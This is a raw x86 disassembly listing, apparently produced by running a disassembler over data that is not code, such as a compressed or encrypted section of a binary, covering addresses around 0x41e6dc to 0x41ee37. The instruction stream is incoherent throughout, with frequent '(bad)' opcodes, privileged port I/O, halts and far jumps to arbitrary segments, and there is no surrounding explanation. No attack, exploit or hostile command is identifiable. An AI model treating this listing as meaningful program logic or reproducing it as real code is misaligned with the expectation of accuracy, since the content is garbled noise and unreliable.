  41e6dc:	ficomp WORD PTR [ebx]
  41e6de:	mov    dl,BYTE PTR [edx+esi*1]
  41e6e1:	out    dx,eax
  41e6e2:	push   ds
  41e6e3:	jae    0x41e6b2
  41e6e5:	pushf  
  41e6e6:	mov    al,ds:0x60cb8c22
  41e6eb:	ins    BYTE PTR es:[edi],dx
  41e6ec:	mov    DWORD PTR [edi+0x501bac77],0xf1c9d42e
  41e6f6:	stos   BYTE PTR es:[edi],al
  41e6f7:	fcom   QWORD PTR gs:[edx-0x2e]
  41e6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6fc:	add    eax,0x308b5675
  41e701:	loope  0x41e695
  41e703:	std    
  41e704:	leave  
  41e705:	push   edi
  41e706:	stos   BYTE PTR es:[edi],al
  41e707:	push   es
  41e708:	sub    dl,BYTE PTR [ebx+0x37]
  41e70b:	xor    al,0x15
  41e70d:	hlt    
  41e70e:	fist   WORD PTR [ebx]
  41e710:	cli    
  41e711:	adc    eax,0x2f0fefd2
  41e716:	test   al,0x99
  41e718:	push   esp
  41e719:	pop    esp
  41e71a:	aam    0xa0
  41e71c:	mov    ebx,0x171897b5
  41e721:	cdq    
  41e722:	jmp    0x6dde:0x196bd1ce
  41e729:	ror    BYTE PTR [eax+0x3572e931],1
  41e72f:	rcl    DWORD PTR [ecx],1
  41e731:	in     eax,dx
  41e732:	cbw    
  41e734:	lea    esi,[edi+0x51b38ce3]
  41e73a:	dec    eax
  41e73b:	(bad)  
  41e73c:	mov    ebp,0x552dfd7a
  41e741:	mov    WORD PTR [esi+0x55d8e788],gs
  41e747:	sub    DWORD PTR [edx],eax
  41e749:	test   DWORD PTR [edi-0x40],edx
  41e74c:	jno    0x41e727
  41e74e:	je     0x41e71d
  41e750:	int3   
  41e751:	retf   
  41e752:	inc    ecx
  41e753:	nop
  41e754:	add    DWORD PTR [eax-0x7636e14a],edi
  41e75a:	pop    eax
  41e75b:	dec    edx
  41e75c:	stos   BYTE PTR es:[edi],al
  41e75d:	lods   al,BYTE PTR ds:[esi]
  41e75e:	jle    0x41e780
  41e760:	fs inc eax
  41e762:	leave  
  41e763:	mov    ds:0x871fb9eb,eax
  41e768:	ss scas eax,DWORD PTR es:[edi]
  41e76a:	xor    ah,BYTE PTR [edi]
  41e76c:	in     al,dx
  41e76d:	frstor [esi+0x79ccb410]
  41e773:	sti    
  41e774:	mov    BYTE PTR ds:0x3662581b,dl
  41e77a:	int3   
  41e77b:	jle    0x41e7ef
  41e77d:	xor    BYTE PTR [edx],bh
  41e77f:	inc    ecx
  41e780:	jne    0x41e741
  41e782:	cmp    bh,BYTE PTR [ebx-0x3f]
  41e785:	ret    0xb438
  41e788:	jns    0x41e740
  41e78a:	out    0x2d,eax
  41e78c:	out    0xce,al
  41e78e:	sub    BYTE PTR [ebp-0x46769b9],al
  41e794:	fldenv [eax]
  41e796:	push   edx
  41e797:	cmc    
  41e798:	jb     0x41e7d3
  41e79a:	sbb    al,0xaf
  41e79c:	clc    
  41e79d:	std    
  41e79e:	in     al,0x4b
  41e7a0:	fild   DWORD PTR [ecx]
  41e7a2:	out    0xd1,al
  41e7a4:	lahf   
  41e7a5:	sbb    DWORD PTR ds:[eax+0x25b84e29],0x9887e9ca
  41e7b0:	fbstp  TBYTE PTR [ebp-0x71eea1e9]
  41e7b6:	push   edx
  41e7b7:	cmp    ebp,DWORD PTR [eax]
  41e7b9:	jp     0x41e799
  41e7bb:	push   ebx
  41e7bc:	push   ebp
  41e7bd:	sub    esi,esp
  41e7bf:	pop    edi
  41e7c0:	add    al,0x33
  41e7c2:	adc    DWORD PTR [ebp+0x6db36488],edi
  41e7c8:	cmp    DWORD PTR [edx],esp
  41e7ca:	jbe    0x41e74f
  41e7cc:	repz jo 0x41e771
  41e7cf:	out    0x98,eax
  41e7d1:	mov    ah,0xc0
  41e7d3:	lds    edx,FWORD PTR [ecx-0x46]
  41e7d6:	neg    bh
  41e7d8:	loope  0x41e786
  41e7da:	add    eax,0xfdc1581a
  41e7df:	add    BYTE PTR [esi],dl
  41e7e1:	add    BYTE PTR [esi+0x62],ah
  41e7e4:	adc    dh,BYTE PTR [ebx+edx*4]
  41e7e7:	(bad)  
  41e7e8:	dec    ecx
  41e7e9:	aas    
  41e7ea:	aaa    
  41e7eb:	sub    edx,DWORD PTR [ebx]
  41e7ed:	loop   0x41e78d
  41e7ef:	mov    ch,0xf9
  41e7f1:	jnp    0x41e7c6
  41e7f3:	gs in  eax,0x97
  41e7f6:	mov    ds:0x12e551fb,eax
  41e7fb:	mov    eax,ds:0xae5af3d8
  41e800:	lahf   
  41e801:	sar    DWORD PTR [edx+0x3d99f1d3],cl
  41e807:	(bad)  
  41e809:	xchg   esi,eax
  41e80a:	sbb    eax,0x626eb321
  41e80f:	es ss std 
  41e812:	in     eax,0xd9
  41e814:	sub    BYTE PTR [edi+edi*8-0x6b],ch
  41e818:	loope  0x41e85a
  41e81a:	sahf   
  41e81b:	ret    
  41e81c:	pushf  
  41e81d:	ror    DWORD PTR [ebp-0x7a],1
  41e820:	shl    DWORD PTR [edx],cl
  41e822:	leavew 
  41e824:	test   BYTE PTR [ecx+0x13056bf5],ah
  41e82a:	or     al,0xea
  41e82c:	and    dl,ch
  41e82e:	retf   
  41e82f:	call   0x32cdc18f
  41e834:	adc    esp,DWORD PTR [esp+edx*4-0x16]
  41e838:	pop    ebx
  41e839:	xchg   esi,eax
  41e83a:	cdq    
  41e83b:	or     BYTE PTR [ecx+0x78],bh
  41e83e:	xor    eax,0x4e80fe4a
  41e843:	inc    edx
  41e844:	xor    edi,DWORD PTR [edx+0x46]
  41e847:	les    esi,FWORD PTR [edx-0x49]
  41e84a:	icebp  
  41e84b:	aas    
  41e84c:	sbb    DWORD PTR [ebx-0x71c6f154],ecx
  41e852:	int3   
  41e853:	gs shr esp,1
  41e856:	(bad)  
  41e857:	aad    0x3
  41e859:	pop    esp
  41e85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e85b:	and    DWORD PTR [edi+edx*8-0x22],0xed424f69
  41e863:	leave  
  41e864:	xchg   esi,eax
  41e865:	adc    ebx,eax
  41e867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e868:	ds stos BYTE PTR es:[edi],al
  41e86a:	jbe    0x41e864
  41e86c:	ss push edx
  41e86e:	pop    esi
  41e86f:	and    ah,cl
  41e871:	xchg   ecx,eax
  41e872:	ins    BYTE PTR es:[edi],dx
  41e873:	jbe    0x41e819
  41e875:	pop    edi
  41e876:	std    
  41e877:	cmp    cl,BYTE PTR [ecx-0x7e80cb6a]
  41e87d:	les    edi,FWORD PTR [eax+0x4e]
  41e880:	jmp    0xc79f:0x8b6df8eb
  41e887:	xchg   BYTE PTR [ecx],bl
  41e889:	push   eax
  41e88a:	push   edi
  41e88b:	aaa    
  41e88c:	or     ebx,eax
  41e88e:	hlt    
  41e88f:	aaa    
  41e890:	lock jbe 0x41e8d9
  41e893:	adc    BYTE PTR [edx+ebp*2+0x1c],bh
  41e897:	js     0x41e849
  41e899:	rep lods eax,DWORD PTR ds:[esi]
  41e89b:	push   ebx
  41e89c:	and    DWORD PTR [edi-0x2a3de6f5],edi
  41e8a2:	jmp    0x952a:0x9fb98c97
  41e8a9:	cdq    
  41e8aa:	call   0xcb0:0xcd9c53ca
  41e8b1:	jp     0x1bae9a6b
  41e8b7:	lods   al,BYTE PTR ds:[esi]
  41e8b8:	setb   BYTE PTR [edi]
  41e8bb:	sar    BYTE PTR [edx-0x39576248],0x7
  41e8c2:	add    cl,cl
  41e8c4:	pushf  
  41e8c5:	call   0x2cbdde50
  41e8ca:	or     DWORD PTR [edx],eax
  41e8cc:	gs mov dl,0xaa
  41e8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8d0:	sub    ecx,DWORD PTR ds:0xf3009d1f
  41e8d6:	mov    esi,0x64eab270
  41e8db:	ret    
  41e8dc:	daa    
  41e8dd:	dec    edi
  41e8de:	mov    dl,0x12
  41e8e0:	xor    ebp,DWORD PTR [ecx]
  41e8e2:	pop    esi
  41e8e3:	mov    eax,0x3df9c913
  41e8e8:	push   cs
  41e8e9:	out    dx,eax
  41e8ea:	sub    ah,dl
  41e8ec:	add    BYTE PTR [eax],dh
  41e8ee:	imul   edx,DWORD PTR [ebp-0x10fefdd7],0xc26f93c0
  41e8f8:	stos   DWORD PTR es:[edi],eax
  41e8f9:	js     0x41e8a4
  41e8fb:	cmp    DWORD PTR [edx-0x2ae43f5c],edx
  41e901:	jno    0x41e8a1
  41e903:	xor    DWORD PTR [edi],edx
  41e905:	jmp    0x8029db73
  41e90a:	sbb    eax,0x6a04e4cd
  41e90f:	es jg  0x41e947
  41e912:	test   DWORD PTR [edx-0x67],esi
  41e915:	jno    0x41e8ca
  41e917:	cmp    dh,0x35
  41e91a:	jno    0x41e8a9
  41e91c:	or     al,0xa7
  41e91e:	mov    BYTE PTR [eax],0x1c
  41e921:	inc    ecx
  41e922:	scas   eax,DWORD PTR es:[edi]
  41e923:	dec    ebx
  41e924:	dec    esi
  41e925:	inc    ebx
  41e926:	mov    al,ds:0xfef0c8cc
  41e92b:	push   esi
  41e92c:	and    BYTE PTR [ebx-0x3c],cl
  41e92f:	mov    al,ds:0xa7c5d2b5
  41e934:	sbb    DWORD PTR ds:0xcc6df47a,ebp
  41e93a:	sbb    bl,ch
  41e93c:	stos   DWORD PTR es:[edi],eax
  41e93d:	arpl   WORD PTR [edx],cx
  41e93f:	rcl    BYTE PTR [ebp+0x5],0xc
  41e943:	xchg   ah,bl
  41e945:	sbb    eax,0x6aae784f
  41e94a:	(bad)  ds:0x8039991
  41e950:	(bad)  
  41e951:	icebp  
  41e952:	dec    eax
  41e953:	aad    0x6d
  41e955:	stos   BYTE PTR es:[edi],al
  41e956:	lods   eax,DWORD PTR ds:[esi]
  41e957:	mov    ebp,0xf11d224f
  41e95c:	scas   al,BYTE PTR es:[edi]
  41e95d:	and    al,0xd0
  41e95f:	popa   
  41e960:	add    BYTE PTR [edi+0x2b],dl
  41e963:	or     esi,DWORD PTR [edi+0x2d]
  41e966:	js     0x41e8f3
  41e968:	fucomi st,st(4)
  41e96a:	cld    
  41e96b:	ror    BYTE PTR [ecx-0x4ea9c619],0x24
  41e972:	jge    0x41e9c0
  41e974:	or     dl,dh
  41e976:	mov    BYTE PTR [eax],bh
  41e978:	push   ss
  41e979:	cmp    eax,0x696e18a8
  41e97e:	push   0x9e96fe24
  41e983:	clc    
  41e984:	mov    ds:0x2277eb5,al
  41e989:	sub    esi,edx
  41e98b:	cmp    ecx,DWORD PTR [ecx-0x3f]
  41e98e:	jl     0x41e9e6
  41e990:	mov    ebx,DWORD PTR ds:0x6dd15fa9
  41e996:	or     esp,DWORD PTR [ebx+0x69ebcf45]
  41e99c:	outs   dx,BYTE PTR ds:[esi]
  41e99d:	imul   esi,esp,0x79a1ebb6
  41e9a3:	popf   
  41e9a4:	mov    cl,0xbc
  41e9a6:	push   eax
  41e9a7:	(bad)  gs:[ecx+0x13e6e09f]
  41e9ae:	inc    esp
  41e9af:	loope  0x41e9e0
  41e9b1:	into   
  41e9b2:	push   edi
  41e9b3:	dec    ebp
  41e9b4:	ret    0xfea4
  41e9b7:	les    ecx,FWORD PTR [edi+esi*2]
  41e9ba:	ret    
  41e9bb:	jl     0x41e9dc
  41e9bd:	jb     0x41e993
  41e9bf:	pop    ebp
  41e9c0:	jae    0x41e9e4
  41e9c2:	imul   BYTE PTR [edx+edx*8+0x4b49bcdb]
  41e9c9:	sub    BYTE PTR [edi+0xa],ch
  41e9cc:	inc    edi
  41e9cd:	(bad)  
  41e9ce:	fwait
  41e9cf:	sub    ebx,DWORD PTR [ebp+0xf5b799d]
  41e9d5:	or     DWORD PTR [edi+0x19bcef59],edx
  41e9db:	lods   eax,DWORD PTR ds:[esi]
  41e9dc:	scas   al,BYTE PTR es:[edi]
  41e9dd:	adc    BYTE PTR [bx+si-0x4],0xdb
  41e9e2:	inc    ecx
  41e9e3:	call   0xd7345c44
  41e9e8:	xor    BYTE PTR [edi-0x31],dl
  41e9eb:	dec    ebp
  41e9ec:	mov    dl,bh
  41e9ee:	mov    dh,0x28
  41e9f0:	add    eax,0xdecb6aaf
  41e9f5:	fisub  WORD PTR [ebp-0x38]
  41e9f8:	sar    BYTE PTR [ecx+edi*8],1
  41e9fb:	lea    esp,[ebp+0x7b]
  41e9fe:	ja     0x41e9b4
  41ea00:	mov    dh,0x93
  41ea02:	add    ch,BYTE PTR [ebx]
  41ea04:	jnp    0x41e9f7
  41ea06:	mov    WORD PTR [esp+esi*2-0x80],ss
  41ea0a:	dec    ebx
  41ea0b:	scas   al,BYTE PTR es:[edi]
  41ea0c:	or     DWORD PTR [ebx-0x2dbbf798],esp
  41ea12:	add    ecx,DWORD PTR [eax+esi*8-0x49]
  41ea16:	sub    DWORD PTR [ebx+0xd],esi
  41ea19:	jns    0x41e9a1
  41ea1b:	jns    0x41ea9a
  41ea1d:	xchg   edx,eax
  41ea1e:	dec    edi
  41ea1f:	adc    eax,0x5690be6b
  41ea24:	xor    BYTE PTR [ecx],bl
  41ea26:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea28:	sub    DWORD PTR [edx+0x46852b15],0xffffff85
  41ea2f:	push   ss
  41ea30:	dec    ecx
  41ea31:	mov    dl,BYTE PTR [ebx-0x6f]
  41ea34:	and    dl,BYTE PTR [edi+0x5c]
  41ea37:	sbb    dl,BYTE PTR [esi+0x27de5e21]
  41ea3d:	test   ebx,edx
  41ea3f:	jle    0x41ea53
  41ea41:	imul   ecx,DWORD PTR [ecx],0x33
  41ea44:	mov    edx,?
  41ea46:	xlat   BYTE PTR ds:[ebx]
  41ea47:	loop   0x41ea62
  41ea49:	mov    ah,0x79
  41ea4b:	test   eax,0xbc09359a
  41ea50:	or     al,ch
  41ea52:	stos   BYTE PTR es:[edi],al
  41ea53:	or     ecx,DWORD PTR [edi+eax*4-0x72]
  41ea57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea58:	mov    dh,0xd1
  41ea5a:	mov    ebp,0x6c5ba05a
  41ea5f:	jmp    DWORD PTR [ebx-0x49]
  41ea62:	mov    BYTE PTR [ebx],ch
  41ea64:	repnz sub bh,BYTE PTR [ebx]
  41ea67:	cwde   
  41ea68:	mov    dl,0x9d
  41ea6a:	test   al,0xb4
  41ea6c:	sbb    eax,0x52edfc94
  41ea71:	fwait
  41ea72:	mov    ecx,0x2df87ac4
  41ea77:	fiadd  DWORD PTR [ecx+0x9]
  41ea7a:	test   DWORD PTR [esi-0x1ef3861e],0xe7408ace
  41ea84:	mov    esi,0x10b9d74c
  41ea89:	inc    edx
  41ea8a:	jl     0x41ea70
  41ea8c:	(bad)  
  41ea8d:	adc    cl,BYTE PTR [ebp+0x66]
  41ea90:	mov    esp,edx
  41ea92:	inc    ecx
  41ea93:	outs   dx,BYTE PTR fs:[esi]
  41ea95:	sahf   
  41ea96:	(bad)  
  41ea98:	pop    ebx
  41ea99:	dec    esi
  41ea9a:	jb     0x41ea5b
  41ea9c:	retf   0x26f4
  41ea9f:	in     eax,dx
  41eaa0:	mov    dl,0x80
  41eaa2:	(bad)  
  41eaa3:	fdiv   DWORD PTR [edi]
  41eaa5:	es jp  0x41ea82
  41eaa8:	mov    dl,0x17
  41eaaa:	xor    edi,DWORD PTR [ecx+0x1e8746b]
  41eab0:	ss neg dl
  41eab3:	mov    ebp,0x53c5b7af
  41eab8:	mov    esi,0xb27082c
  41eabd:	call   0xf97b:0x78be5bb1
  41eac4:	in     al,0x4
  41eac6:	loop   0x41eaf2
  41eac8:	inc    ebx
  41eac9:	nop
  41eaca:	ret    0xba8
  41eacd:	jmp    0x2275955
  41ead2:	jbe    0x41ea7b
  41ead4:	pop    esi
  41ead5:	push   ebx
  41ead6:	aad    0xb5
  41ead8:	fist   DWORD PTR [eax]
  41eada:	test   eax,0x2bc16247
  41eadf:	mov    eax,ds:0x7fa8b558
  41eae4:	cwde   
  41eae5:	cmc    
  41eae6:	lods   eax,DWORD PTR ds:[esi]
  41eae7:	add    edi,DWORD PTR [ebp+eax*1-0x52]
  41eaeb:	dec    DWORD PTR [edi-0x30c9c222]
  41eaf1:	or     cl,BYTE PTR [ebx]
  41eaf3:	ss pushf 
  41eaf5:	(bad)  
  41eaf6:	ins    DWORD PTR es:[edi],dx
  41eaf7:	cmc    
  41eaf8:	inc    ebp
  41eaf9:	sahf   
  41eafa:	jmp    0x8fca:0xd9187dbc
  41eb01:	push   esp
  41eb02:	shl    ebp,1
  41eb04:	test   BYTE PTR [edx+0x78ae5f99],ah
  41eb0a:	hlt    
  41eb0b:	fs dec ebp
  41eb0d:	ret    0xa009
  41eb10:	shl    esi,1
  41eb12:	and    al,0xa3
  41eb14:	je     0x41eadd
  41eb16:	pop    ss
  41eb17:	ss loopne 0x41eb26
  41eb1a:	mov    ah,0x93
  41eb1c:	sbb    cl,BYTE PTR [ebx-0x6b]
  41eb1f:	in     al,0x73
  41eb21:	inc    ecx
  41eb22:	sub    eax,0x59a9b863
  41eb27:	mov    dh,0x48
  41eb29:	hlt    
  41eb2a:	adc    esi,DWORD PTR [ebx]
  41eb2c:	dec    eax
  41eb2d:	sbb    al,0x58
  41eb2f:	jmp    0x41eb84
  41eb31:	push   esp
  41eb32:	je     0x41eb53
  41eb34:	stos   DWORD PTR es:[edi],eax
  41eb35:	std    
  41eb36:	loop   0x41eaed
  41eb38:	mov    esi,DWORD PTR [ecx+0x27]
  41eb3b:	add    BYTE PTR [ebx+edi*1-0x35a5e7c],al
  41eb42:	inc    ebx
  41eb43:	rcl    DWORD PTR [esi-0x2b],0x63
  41eb47:	rol    BYTE PTR ds:0x4a6277a3,0xb6
  41eb4e:	into   
  41eb4f:	(bad)  [edi]
  41eb51:	ins    DWORD PTR es:[edi],dx
  41eb52:	das    
  41eb53:	aaa    
  41eb54:	cmp    DWORD PTR [edi-0x20c8bc32],esi
  41eb5a:	cs jae 0x41eb84
  41eb5d:	out    dx,eax
  41eb5e:	hlt    
  41eb5f:	test   al,0x71
  41eb61:	or     ah,BYTE PTR [ebx-0x61]
  41eb64:	sub    DWORD PTR [eax],0xea107e06
  41eb6a:	pop    ebx
  41eb6b:	popf   
  41eb6c:	rol    DWORD PTR ds:[ecx-0x2c],cl
  41eb70:	test   BYTE PTR [edi+0x3],al
  41eb73:	or     ebp,ebx
  41eb75:	lods   eax,DWORD PTR ds:[esi]
  41eb76:	imul   eax,eax,0xffffff83
  41eb79:	jecxz  0x41ebb8
  41eb7b:	and    cl,dl
  41eb7d:	push   edx
  41eb7e:	call   0xd8feed34
  41eb83:	enter  0x6118,0x6c
  41eb87:	fdivr  DWORD PTR [eax+0x2e]
  41eb8a:	push   cs
  41eb8b:	test   BYTE PTR [ecx-0x58],ch
  41eb8e:	fwait
  41eb8f:	mov    BYTE PTR cs:[ebp+0x70a613e],cl
  41eb96:	pop    edx
  41eb97:	xchg   DWORD PTR [ecx],eax
  41eb99:	sar    BYTE PTR [ecx],0xe6
  41eb9c:	out    dx,eax
  41eb9d:	inc    ebp
  41eb9e:	jbe    0x41ebb6
  41eba0:	pop    ebp
  41eba1:	pop    edi
  41eba2:	sbb    al,0x38
  41eba4:	sub    BYTE PTR [eax-0x29],al
  41eba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba8:	gs or  al,0x14
  41ebab:	add    BYTE PTR [ecx],bh
  41ebad:	mov    edx,0xde443343
  41ebb2:	addr16 pop eax
  41ebb4:	and    DWORD PTR [esi-0x6050ead6],edi
  41ebba:	cmp    cl,al
  41ebbc:	or     dl,BYTE PTR [edi]
  41ebbe:	inc    esi
  41ebbf:	push   ebx
  41ebc0:	mov    ah,0x17
  41ebc2:	fild   DWORD PTR [esi-0x4c1b4025]
  41ebc8:	(bad)  
  41ebc9:	pop    ecx
  41ebca:	lods   al,BYTE PTR ds:[esi]
  41ebcb:	inc    edi
  41ebcc:	push   es
  41ebcd:	mov    al,ds:0x80f1237f
  41ebd2:	inc    esp
  41ebd3:	icebp  
  41ebd4:	in     eax,0xc
  41ebd6:	mov    ds:0x2cf4d399,al
  41ebdb:	dec    edx
  41ebdc:	mov    esi,0xa317b193
  41ebe1:	and    al,0xad
  41ebe3:	out    dx,eax
  41ebe4:	push   ebx
  41ebe5:	mov    gs,edx
  41ebe7:	adc    eax,0x74b6b468
  41ebec:	add    cl,BYTE PTR [esi+0x8]
  41ebef:	add    cl,BYTE PTR [eax]
  41ebf1:	lods   al,BYTE PTR ds:[esi]
  41ebf2:	sbb    DWORD PTR [edi],eax
  41ebf4:	fwait
  41ebf5:	add    DWORD PTR ds:0x7c2b1752,ebp
  41ebfb:	lock scas al,BYTE PTR es:[edi]
  41ebfd:	sbb    BYTE PTR [ebx],bl
  41ebff:	popa   
  41ec00:	fild   QWORD PTR [edx+0x2d]
  41ec03:	adc    al,BYTE PTR [esi-0x75]
  41ec06:	push   0x128b7cfc
  41ec0b:	pop    ds
  41ec0c:	add    BYTE PTR [ecx],0x33
  41ec0f:	mov    ah,0xe5
  41ec11:	cmp    DWORD PTR [ebp+0x6c],0x51
  41ec15:	cwde   
  41ec16:	or     dh,BYTE PTR [esi]
  41ec18:	jp     0x41ec60
  41ec1a:	stos   DWORD PTR es:[edi],eax
  41ec1b:	(bad)
  41ec1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec1f:	inc    ecx
  41ec20:	inc    ebp
  41ec21:	repz fsubr QWORD PTR [esi-0x19]
  41ec25:	push   0xffffffe5
  41ec27:	es xor edi,edi
  41ec2a:	push   esi
  41ec2b:	push   ebp
  41ec2c:	in     al,dx
  41ec2d:	push   edi
  41ec2e:	cmp    eax,0x3bfb4830
  41ec33:	inc    esi
  41ec34:	test   BYTE PTR [ebp-0x6f],ch
  41ec37:	(bad)  
  41ec38:	pop    edi
  41ec39:	jge    0x41ec42
  41ec3b:	scas   eax,DWORD PTR es:[edi]
  41ec3c:	push   esp
  41ec3d:	sub    eax,0x95dff0e1
  41ec42:	clc    
  41ec43:	arpl   di,bx
  41ec45:	sbb    BYTE PTR [ebx+0x5551c086],al
  41ec4b:	mov    ds:0x1bc567e0,eax
  41ec50:	inc    edi
  41ec51:	mov    al,BYTE PTR [esi]
  41ec53:	add    bh,BYTE PTR [ecx-0x6b432ea1]
  41ec59:	stos   DWORD PTR es:[edi],eax
  41ec5a:	and    cl,cl
  41ec5c:	fnsave [ebx-0x5e858432]
  41ec62:	xchg   BYTE PTR [edi+0x6b75acba],cl
  41ec68:	pop    ds
  41ec69:	hlt    
  41ec6a:	int3   
  41ec6b:	sti    
  41ec6c:	shl    DWORD PTR [eax],1
  41ec6e:	out    dx,eax
  41ec6f:	inc    ebx
  41ec70:	enter  0x30bb,0x7f
  41ec74:	in     eax,0x7f
  41ec76:	mov    edx,0xa72dc469
  41ec7b:	sub    BYTE PTR [edi+esi*2-0xd],bh
  41ec7f:	push   edi
  41ec80:	leave  
  41ec81:	xchg   ebp,esi
  41ec83:	inc    esi
  41ec84:	retf   0x4b1
  41ec87:	hlt    
  41ec88:	nop
  41ec89:	xchg   edx,eax
  41ec8a:	fdivr  DWORD PTR [eax+ecx*1+0x27a461de]
  41ec91:	lea    ecx,[ebx+0x73]
  41ec94:	test   ah,bl
  41ec96:	lea    edi,[ebx]
  41ec98:	add    ch,BYTE PTR [edx-0x23]
  41ec9b:	inc    ecx
  41ec9c:	ins    DWORD PTR es:[edi],dx
  41ec9d:	loope  0x41ec37
  41ec9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca0:	adc    al,0x44
  41eca2:	das    
  41eca3:	or     eax,0x11e9a21e
  41eca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca9:	mov    ch,0x5d
  41ecab:	sub    esp,DWORD PTR [eax-0x6375a532]
  41ecb1:	push   edi
  41ecb2:	retf   
  41ecb3:	bound  edx,QWORD PTR [si]
  41ecb6:	mov    esp,0xd58be5ca
  41ecbb:	leave  
  41ecbc:	mov    al,0x30
  41ecbe:	scas   eax,DWORD PTR es:[edi]
  41ecbf:	sub    eax,0xb8218658
  41ecc4:	cmp    al,0xd8
  41ecc6:	and    al,0x20
  41ecc8:	xchg   bl,ah
  41ecca:	mov    BYTE PTR [ebp+0xe386cb0],ch
  41ecd0:	loope  0x41ecfc
  41ecd2:	cmovl  ecx,DWORD PTR [ecx+0x7f161b92]
  41ecd9:	sar    DWORD PTR [ebx-0x4194aa6c],1
  41ecdf:	das    
  41ece0:	mov    esp,0x5e5a6f86
  41ece5:	dec    ebp
  41ece6:	add    eax,0x6e7de11e
  41eceb:	rol    BYTE PTR [ebx-0x6e8d6943],cl
  41ecf1:	mov    ah,BYTE PTR [edx-0x6]
  41ecf4:	out    0x39,al
  41ecf6:	sbb    eax,0xb97d9b71
  41ecfb:	mov    eax,0xf1562297
  41ed00:	leave  
  41ed01:	mov    dl,0x6c
  41ed03:	retf   0x1be5
  41ed06:	dec    esi
  41ed07:	dec    ebx
  41ed08:	push   ds
  41ed09:	cmpxchg DWORD PTR [ebx],ebp
  41ed0c:	imul   eax,esi,0xfc82da9e
  41ed12:	mov    ds:0xe0df350e,al
  41ed17:	xor    dl,cl
  41ed19:	mov    eax,0x284291c0
  41ed1e:	adc    eax,0xa9f0e33c
  41ed23:	add    al,0x59
  41ed25:	aam    0x71
  41ed27:	cmc    
  41ed28:	out    0x5e,eax
  41ed2a:	or     dl,BYTE PTR [edx]
  41ed2c:	or     al,0xc1
  41ed2e:	push   cs
  41ed2f:	mov    dl,0x3b
  41ed31:	sbb    ah,dl
  41ed33:	cmp    BYTE PTR [edi+0x67],0xed
  41ed37:	or     al,0x36
  41ed39:	jbe    0x41ed4c
  41ed3b:	mov    DWORD PTR [eax],esi
  41ed3d:	dec    esi
  41ed3e:	imul   DWORD PTR ds:0x288d4047
  41ed44:	ds into 
  41ed46:	(bad)  
  41ed47:	test   BYTE PTR es:[ebp-0x78101b6d],al
  41ed4e:	or     ch,BYTE PTR [eax-0x4e636324]
  41ed54:	scas   eax,DWORD PTR es:[edi]
  41ed55:	cmp    ebp,DWORD PTR [edi+0x5e]
  41ed58:	(bad)  
  41ed59:	and    edx,DWORD PTR [ebx-0x63de0016]
  41ed5f:	(bad)  
  41ed60:	jmp    0xb65f:0xe134992b
  41ed67:	arpl   WORD PTR [ebx+ebp*4],ax
  41ed6a:	jb     0x41ecef
  41ed6c:	test   DWORD PTR [eax+0x26],0x9b424307
  41ed73:	add    eax,0xe6534901
  41ed78:	xchg   dl,dh
  41ed7a:	sti    
  41ed7b:	mov    ecx,0x74fd9bd2
  41ed80:	mov    edi,0x7f6fdf3a
  41ed85:	or     eax,0x7294f0f2
  41ed8a:	push   esi
  41ed8b:	mov    ds:0x5fbdaff6,al
  41ed90:	or     eax,0xfaedbded
  41ed95:	xchg   esi,eax
  41ed96:	push   ds
  41ed97:	and    DWORD PTR [ecx],ebx
  41ed99:	clc    
  41ed9a:	inc    esp
  41ed9b:	xor    ah,ah
  41ed9d:	aad    0x25
  41ed9f:	xor    BYTE PTR [eax+0x20],al
  41eda2:	mov    dh,0xc8
  41eda4:	dec    ecx
  41eda5:	mov    ecx,0x9084c9ac
  41edaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edab:	and    eax,DWORD PTR [edx-0x387d8383]
  41edb1:	outs   dx,DWORD PTR ds:[esi]
  41edb2:	cmp    DWORD PTR [ecx+0x76],esi
  41edb5:	xchg   DWORD PTR [ebp-0x3d194392],ebx
  41edbb:	jno    0x41edc3
  41edbd:	inc    ecx
  41edbe:	or     esi,DWORD PTR [ebp-0x41bf5d3f]
  41edc4:	(bad)  
  41edc5:	pop    eax
  41edc6:	pushf  
  41edc7:	pop    ds
  41edc8:	inc    BYTE PTR [ebx+0x2cb215b5]
  41edce:	add    edi,edi
  41edd0:	jns    0x41ed52
  41edd2:	retf   0x3af6
  41edd5:	dec    dh
  41edd7:	or     DWORD PTR [eax+0x2f],0xffffff88
  41eddb:	outs   dx,DWORD PTR ds:[esi]
  41eddc:	sbb    DWORD PTR [ecx-0x28],ebx
  41eddf:	push   ds
  41ede0:	inc    esp
  41ede1:	(bad)  
  41ede2:	bound  edx,QWORD PTR [ebx+0x58]
  41ede5:	jg     0x41ee43
  41ede7:	and    eax,0x8739949
  41edec:	pop    ebp
  41eded:	cmp    ah,BYTE PTR [edx-0x652c1f37]
  41edf3:	ss jns 0x41ee2e
  41edf6:	mov    dl,ah
  41edf8:	dec    edx
  41edf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edfa:	dec    eax
  41edfb:	jnp    0x41edbd
  41edfd:	addr16 push eax
  41edff:	retf   0xa7d4
  41ee02:	add    dl,BYTE PTR [esi+ebx*4-0x63523ebd]
  41ee09:	sub    BYTE PTR [eax-0x3e],dh
  41ee0c:	cmp    al,0x5e
  41ee0e:	scas   eax,DWORD PTR es:[edi]
  41ee0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee10:	mov    ch,BYTE PTR [ecx-0x709524c9]
  41ee16:	inc    ecx
  41ee17:	pop    esp
  41ee18:	push   cs
  41ee19:	mov    DWORD PTR es:[ecx+0x37],0x306ef03b
  41ee21:	push   es
  41ee22:	xchg   ecx,eax
  41ee23:	xor    dh,BYTE PTR [esp+ebp*4]
  41ee26:	and    DWORD PTR [edi+esi*8+0x23],ebx
  41ee2a:	add    BYTE PTR [edx],0x96
  41ee2d:	icebp  
  41ee2e:	nop
  41ee2f:	jne    0x41ee3f
  41ee31:	es jmp 0xf83c5b7b
  41ee37:	push   edi
